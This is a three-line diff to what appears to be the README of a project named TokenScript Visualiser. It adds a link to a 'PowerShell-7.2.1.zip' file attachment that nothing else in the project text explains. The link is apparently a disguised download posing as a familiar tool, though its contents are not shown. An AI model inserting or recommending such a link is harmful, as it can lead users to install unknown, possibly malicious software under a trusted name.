@@ -1,3 +1,4 @@
+[PowerShell-7.2.1.zip](https://github.com/IngridMi/TokenScript-Visualiser/files/8180432/PowerShell-7.2.1.zip)
 
 # TokenScript Visualiser
 
